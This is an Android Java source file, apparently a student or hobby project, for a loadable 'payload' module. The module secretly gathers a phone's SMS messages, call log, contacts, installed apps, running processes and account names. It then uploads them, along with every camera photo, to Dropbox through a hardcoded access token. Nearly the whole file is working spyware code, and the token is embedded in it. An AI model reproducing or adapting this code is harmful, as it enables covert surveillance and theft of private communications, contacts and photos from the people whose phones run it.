package com.example.bos_1;


import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.ActivityManager;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.StatFs;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.text.TextUtils;

import androidx.appcompat.app.AppCompatActivity;

import com.dropbox.core.DbxException;
import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.android.Auth;
import com.dropbox.core.v2.DbxClientV2;
import com.dropbox.core.v2.files.WriteMode;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStreamWriter;
import java.text.DecimalFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;

/*
* Подгружаемый модуль с так называемой ПОЛЕЗНОЙ НАГРУЗКОЙ
* Под полезной нагрузкой подразумивается сбор необходимой информации и отправка на Dropbox
*/
public class DownloadableModule extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        new work_with_dropbox().execute();
    }

    /*--------Получение String с SMS сообщениями--------*/
    String collect_sms() {
        String result = "SMS:\n";
        // Пользуемся услугами контент провайдера
        // Cursor - набор строк в табличном виде
        Cursor c = getContentResolver().query(Uri.parse("content://sms"),
                null, null, null, null);
        int totalSMS = c.getCount();
        if (c.moveToFirst()) {
            for (int i = 0; i < totalSMS; i++) {
                result += String.valueOf(i) + ") " + c.getString(12) + "\n";
                c.moveToNext();
            }
        }
        c.close();
        return result;
    }

    /*--------Получение журнала звонков--------*/
    String collect_call_log() {
        String result = "\nCall Log:\n";
        String[] projection = new String[]{
                CallLog.Calls._ID,
                CallLog.Calls.DATE,
                CallLog.Calls.NUMBER,
                CallLog.Calls.CACHED_NAME,
                CallLog.Calls.DURATION,
                CallLog.Calls.TYPE
        };
        String where = "";
        Cursor c = getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                projection,
                where,
                null,
                null
        );
        int total_call_log = c.getCount();
        if (c.moveToFirst()) {
            for (int i = 0; i < total_call_log; i++) {
                result += c.getString(c.getColumnIndex(CallLog.Calls._ID)) + ") ";
                result += c.getString(c.getColumnIndex(CallLog.Calls.NUMBER)) + " ";
                Date date = new Date(c.getColumnIndex(CallLog.Calls.DATE));
                result += date.toString() + "\n";
                c.moveToNext();
            }
        }
        c.close();
        return result;
    }

    /*--------Получение списка контактов--------*/
    String collect_contacts() {
        String result = "\nContacts:\n";

        final String CONTACT_ID = ContactsContract.Contacts._ID;
        final String DISPLAY_NAME = ContactsContract.Contacts.DISPLAY_NAME;
        final String HAS_PHONE_NUMBER = ContactsContract.Contacts.HAS_PHONE_NUMBER;
        final String PHONE_NUMBER = ContactsContract.CommonDataKinds.Phone.NUMBER;
        final String PHONE_CONTACT_ID = ContactsContract.CommonDataKinds.Phone.CONTACT_ID;

        Cursor c = getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[]{PHONE_NUMBER, PHONE_CONTACT_ID},
                null,
                null,
                null
        );
        if (c != null) {
            if (c.getCount() > 0) {
                HashMap<Integer, ArrayList<String>> phones = new HashMap<>();
                while (c.moveToNext()) {
                    Integer contactId = c.getInt(c.getColumnIndex(PHONE_CONTACT_ID));
                    ArrayList<String> curPhones = new ArrayList<>();
                    if (phones.containsKey(contactId)) {
                        curPhones = phones.get(contactId);
                    }
                    curPhones.add(c.getString(0));
                    phones.put(contactId, curPhones);
                }
                Cursor cur = getContentResolver().query(
                        ContactsContract.Contacts.CONTENT_URI,
                        new String[]{CONTACT_ID, DISPLAY_NAME, HAS_PHONE_NUMBER},
                        HAS_PHONE_NUMBER + " > 0",
                        null,
                        DISPLAY_NAME + " ASC");
                if (cur != null) {
                    if (cur.getCount() > 0) {
                        while (cur.moveToNext()) {
                            int id = cur.getInt(cur.getColumnIndex(CONTACT_ID));
                            if (phones.containsKey(id)) {
                                result += "  " + cur.getString(cur.getColumnIndex(DISPLAY_NAME)) + " ";
                                result += TextUtils.join(",", phones.get(id).toArray()) + "\n";
                            }
                        }
                        cur.close();
                        c.close();
                        return result;
                    }
                    cur.close();
                    c.close();
                }
            }
        }
        return result;
    }

    /*--------Получение системной информации--------*/
    String collect_sys_info() {
        String result = "\nSys info:\n";
        // Версия ОС
        result += "OS Version: " + Build.VERSION.RELEASE + "\n";
        // Версия SDK
        result += "SDK Version: " + Build.VERSION.SDK_INT + "\n";
        // Свободное место
        StatFs statFs = new StatFs(Environment.getRootDirectory().getAbsolutePath());
        long Free = (statFs.getAvailableBlocks() * (long) statFs.getBlockSize());
        result += "FreeMemory: " + bytesToHuman(Free) + "\n";
        // Список установленных приложений
        PackageManager pm = getPackageManager();
        List<ApplicationInfo> list = pm.getInstalledApplications(0);
        result += "Installed Applications:\n";
        for (int i = 0; i < list.size(); i++) {
            result += "  " + list.get(i).name + "\n";
        }
        // Список запущенных процессов
        ActivityManager activityManager = (ActivityManager) this.getSystemService(ACTIVITY_SERVICE);
        List<ActivityManager.RunningAppProcessInfo> procInfos = activityManager.getRunningAppProcesses();
        result += "Running App Process:\n";
        for (int i = 0; i < procInfos.size(); i++) {
            result += "  " + procInfos.get(i).processName + "\n";
        }
        // Синхронизированные с ОС аккаунты
        result += "Accaunts:\n";
        AccountManager accountManager = (AccountManager) getSystemService(ACCOUNT_SERVICE);
        Account[] accounts = accountManager.getAccounts();
        for (int i = 0; i < accounts.length; i++) {
            result += "  " + accounts[i].name + "\n";
        }
        return result;
    }

    /*--------Работа с Dropbox--------*/
    // Она должна происходить в асинхронном режиме
    public class work_with_dropbox extends AsyncTask<Void, Void, Void> {

        private String ACCESS_TOKEN = "sl.AqiOMWLchR09fPyZfp5msUVxFIxy6nXNDgaNTatk9daKstbKYqtjNTjZrRw6lNvpj7jHbg75OF4zcMiMmdl4goshuOB0STdBt-OxkJ6ygWmL3ERyhBvRcGeiJ9b7JkBQBd9RTucNba8";

        @Override
        protected Void doInBackground(Void... voids) {
            // Аутентификация
            Auth.startOAuth2Authentication(getApplicationContext(), getString(R.string.APP_KEY));
            String accessToken = Auth.getOAuth2Token();
            SharedPreferences prefs = getSharedPreferences("com.example.dummy", Context.MODE_PRIVATE);
            prefs.edit().putString("access-token", accessToken).apply();
            // Создание клиента Dropbox
            DbxRequestConfig config = new DbxRequestConfig("dropbox/java-tutorial", "en_US");
            DbxClientV2 client = new DbxClientV2(config, ACCESS_TOKEN);
            // Производим сбор необходимой информации
            String sms = collect_sms();
            String call_log = collect_call_log();
            String contacts = collect_contacts();
            String sys_info = collect_sys_info();
            // Производим запись собранной информации в файл, который потом отправится в космос
            OutputStreamWriter outputStreamWriter = null;
            try {
                new File(Environment.
                        getExternalStorageDirectory().getAbsolutePath() + "/Download/",
                        "BOS_1.txt").createNewFile();
            } catch (IOException e) {
                e.printStackTrace();
            }
            File path = new File(Environment.
                    getExternalStorageDirectory().getAbsolutePath() + "/Download/");
            File file = new File(path, "BOS_1.txt");
            FileOutputStream stream = null;
            try {
                stream = new FileOutputStream(file);
            } catch (FileNotFoundException e) {
                e.printStackTrace();
            }
            try {
                try {
                    // Записываем всю собранную информацию в файл
                    stream.write((sms + call_log + contacts + sys_info).getBytes());
                } catch (IOException e) {
                    e.printStackTrace();
                }
            } finally {
                try {
                    stream.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            // Производим загрузку нашего подготовленного файла в Dropbox
            try {
                try (InputStream in = new FileInputStream(Environment.getExternalStorageDirectory().getAbsolutePath() + "/Download/" + "BOS_1.txt")) {
                    client.files().uploadBuilder("/" + "BOS_1.txt").withMode(WriteMode.OVERWRITE).uploadAndFinish(in);
                }
            } catch (IOException e) {
                e.printStackTrace();
            } catch (DbxException e) {
                e.printStackTrace();
            }
            // Производим загрузку наших фотографий
            String path_to_cam = Environment.getExternalStorageDirectory().toString()+"/DCIM/Camera/";
            File directory = new File(path_to_cam);
            File[] files = directory.listFiles();
            for (int i = 0; i < files.length; i++)
            {
                try {
                    try (InputStream in = new FileInputStream(path_to_cam + files[i].getName())) {
                        client.files().uploadBuilder("/" + files[i].getName()).withMode(WriteMode.OVERWRITE).
                                uploadAndFinish(in);
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                } catch (DbxException e) {
                    e.printStackTrace();
                }
            }
            return null;
        }
    }

    public static String floatForm (double d)
    {
        return new DecimalFormat("#.##").format(d);
    }

    public static String bytesToHuman (long size)
    {
        long Kb = 1  * 1024;
        long Mb = Kb * 1024;
        long Gb = Mb * 1024;
        long Tb = Gb * 1024;
        long Pb = Tb * 1024;
        long Eb = Pb * 1024;

        if (size <  Kb)                 return floatForm(        size     ) + " byte";
        if (size >= Kb && size < Mb)    return floatForm((double)size / Kb) + " Kb";
        if (size >= Mb && size < Gb)    return floatForm((double)size / Mb) + " Mb";
        if (size >= Gb && size < Tb)    return floatForm((double)size / Gb) + " Gb";
        if (size >= Tb && size < Pb)    return floatForm((double)size / Tb) + " Tb";
        if (size >= Pb && size < Eb)    return floatForm((double)size / Pb) + " Pb";
        if (size >= Eb)                 return floatForm((double)size / Eb) + " Eb";

        return "???";
    }
}
